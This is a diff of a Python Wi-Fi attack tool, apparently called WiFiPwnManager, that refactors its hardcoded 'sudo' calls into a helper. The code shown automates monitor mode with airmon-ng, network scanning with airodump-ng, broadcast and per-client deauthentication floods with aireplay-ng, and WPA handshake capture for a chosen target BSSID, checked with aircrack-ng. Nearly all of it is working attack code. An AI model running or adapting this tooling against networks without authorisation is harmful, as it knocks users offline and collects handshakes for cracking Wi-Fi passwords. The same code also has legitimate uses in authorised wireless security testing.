@@ -40,6 +40,11 @@ def set_log_queue(q: Queue):
     log_queue = q
 
 
+def _sudo():
+    """Return ['sudo'] prefix when not running as root, else empty list."""
+    return [] if os.geteuid() == 0 else ["sudo"]
+
+
 def _emit(tool, message):
     """Log and enqueue a message for the web UI."""
     logging.info(f"[{tool}] {message}")
@@ -176,12 +181,12 @@ class WiFiPwnManager:
 
             # Kill interfering processes
             subprocess.run(
-                ["sudo", "airmon-ng", "check", "kill"],
+                _sudo() + ["airmon-ng", "check", "kill"],
                 capture_output=True, text=True, timeout=15
             )
 
             result = subprocess.run(
-                ["sudo", "airmon-ng", "start", interface],
+                _sudo() + ["airmon-ng", "start", interface],
                 capture_output=True, text=True, timeout=15
             )
 
@@ -235,12 +240,12 @@ class WiFiPwnManager:
         try:
             _emit("wifi", f"Disabling monitor mode on {iface}...")
             subprocess.run(
-                ["sudo", "airmon-ng", "stop", iface],
+                _sudo() + ["airmon-ng", "stop", iface],
                 capture_output=True, text=True, timeout=15
             )
             # Restart network manager
             subprocess.run(
-                ["sudo", "systemctl", "start", "NetworkManager"],
+                _sudo() + ["systemctl", "start", "NetworkManager"],
                 capture_output=True, text=True, timeout=10
             )
             self.monitor_iface = None
@@ -262,11 +267,11 @@ class WiFiPwnManager:
             return []
 
         csv_prefix = str(HANDSHAKE_DIR / "scan_result")
-        # Remove old scan files (may be root-owned from sudo airodump)
+        # Remove old scan files
         old_files = glob.glob(f"{csv_prefix}*")
         if old_files:
             subprocess.run(
-                ["sudo", "rm", "-f"] + old_files,
+                _sudo() + ["rm", "-f"] + old_files,
                 capture_output=True, timeout=5
             )
 
@@ -274,8 +279,8 @@ class WiFiPwnManager:
 
         try:
             proc = subprocess.Popen(
-                [
-                    "sudo", "airodump-ng",
+                _sudo() + [
+                    "airodump-ng",
                     "--output-format", "csv",
                     "--write", csv_prefix,
                     iface,
@@ -303,13 +308,13 @@ class WiFiPwnManager:
             _emit("wifi", f"No CSV output file found at {csv_file}")
             return []
 
-        # Read the CSV (may be root-owned)
+        # Read the CSV
         try:
             with open(csv_file, "r", errors="ignore") as f:
                 csv_content = f.read()
         except PermissionError:
             result = subprocess.run(
-                ["sudo", "cat", csv_file],
+                _sudo() + ["cat", csv_file],
                 capture_output=True, text=True, timeout=5
             )
             csv_content = result.stdout
@@ -427,14 +432,14 @@ class WiFiPwnManager:
                     old = glob.glob(f"{csv_prefix}*")
                     if old:
                         subprocess.run(
-                            ["sudo", "rm", "-f"] + old,
+                            _sudo() + ["rm", "-f"] + old,
                             capture_output=True, timeout=5,
                         )
 
                     # Run a quick scan burst
                     proc = subprocess.Popen(
-                        [
-                            "sudo", "airodump-ng",
+                        _sudo() + [
+                            "airodump-ng",
                             "--output-format", "csv",
                             "--write", csv_prefix,
                             iface,
@@ -467,7 +472,7 @@ class WiFiPwnManager:
                             csv_content = f.read()
                     except PermissionError:
                         r = subprocess.run(
-                            ["sudo", "cat", csv_file],
+                            _sudo() + ["cat", csv_file],
                             capture_output=True, text=True, timeout=5,
                         )
                         csv_content = r.stdout
@@ -497,7 +502,7 @@ class WiFiPwnManager:
                 old = glob.glob(f"{csv_prefix}*")
                 if old:
                     subprocess.run(
-                        ["sudo", "rm", "-f"] + old,
+                        _sudo() + ["rm", "-f"] + old,
                         capture_output=True, timeout=5,
                     )
 
@@ -536,7 +541,7 @@ class WiFiPwnManager:
 
         # Set channel first
         subprocess.run(
-            ["sudo", "iwconfig", iface, "channel", str(channel)],
+            _sudo() + ["iwconfig", iface, "channel", str(channel)],
             capture_output=True, text=True, timeout=5,
         )
 
@@ -547,7 +552,7 @@ class WiFiPwnManager:
             # Broadcast deauth (kicks everyone)
             _emit("wifi", f"Deauth round {r+1}/{rounds} → {bssid} (broadcast)")
             subprocess.run(
-                ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid, iface],
+                _sudo() + ["aireplay-ng", "--deauth", str(count), "-a", bssid, iface],
                 capture_output=True, text=True, timeout=20,
             )
 
@@ -558,7 +563,7 @@ class WiFiPwnManager:
                         break
                     _emit("wifi", f"  Deauth → client {cmac}")
                     subprocess.run(
-                        ["sudo", "aireplay-ng", "--deauth", str(count),
+                        _sudo() + ["aireplay-ng", "--deauth", str(count),
                          "-a", bssid, "-c", cmac, iface],
                         capture_output=True, text=True, timeout=20,
                     )
@@ -580,11 +585,11 @@ class WiFiPwnManager:
         self.current_target = {"bssid": bssid, "essid": essid, "channel": channel}
         cap_prefix = str(HANDSHAKE_DIR / f"hs_{bssid.replace(':', '')}")
 
-        # Remove old capture files for this BSSID (may be root-owned)
+        # Remove old capture files for this BSSID
         old_caps = glob.glob(f"{cap_prefix}*")
         if old_caps:
             subprocess.run(
-                ["sudo", "rm", "-f"] + old_caps,
+                _sudo() + ["rm", "-f"] + old_caps,
                 capture_output=True, timeout=5
             )
 
@@ -593,14 +598,14 @@ class WiFiPwnManager:
 
         # Set channel
         subprocess.run(
-            ["sudo", "iwconfig", iface, "channel", str(channel)],
+            _sudo() + ["iwconfig", iface, "channel", str(channel)],
             capture_output=True, text=True, timeout=5,
         )
 
         # Start airodump-ng capturing for this BSSID
         airodump = subprocess.Popen(
-            [
-                "sudo", "airodump-ng",
+            _sudo() + [
+                "airodump-ng",
                 "--bssid", bssid,
                 "--channel", str(channel),
                 "--output-format", "cap",
@@ -626,7 +631,7 @@ class WiFiPwnManager:
 
                 # Broadcast deauth
                 subprocess.run(
-                    ["sudo", "aireplay-ng", "--deauth", "15",
+                    _sudo() + ["aireplay-ng", "--deauth", "15",
                      "-a", bssid, iface],
                     capture_output=True, text=True, timeout=20,
                 )
@@ -637,7 +642,7 @@ class WiFiPwnManager:
                         if deauth_stop.is_set() or self._stop_event.is_set():
                             return
                         subprocess.run(
-                            ["sudo", "aireplay-ng", "--deauth", "10",
+                            _sudo() + ["aireplay-ng", "--deauth", "10",
                              "-a", bssid, "-c", cmac, iface],
                             capture_output=True, text=True, timeout=15,
                         )
@@ -716,7 +721,7 @@ class WiFiPwnManager:
     def _verify_handshake(self, cap_file, bssid):
         """Use aircrack-ng to verify a captured handshake."""
         try:
-            cmd = ["sudo", "aircrack-ng", cap_file]
+            cmd = _sudo() + ["aircrack-ng", cap_file]
             if bssid:
                 cmd.extend(["-b", bssid])
             result = subprocess.run(
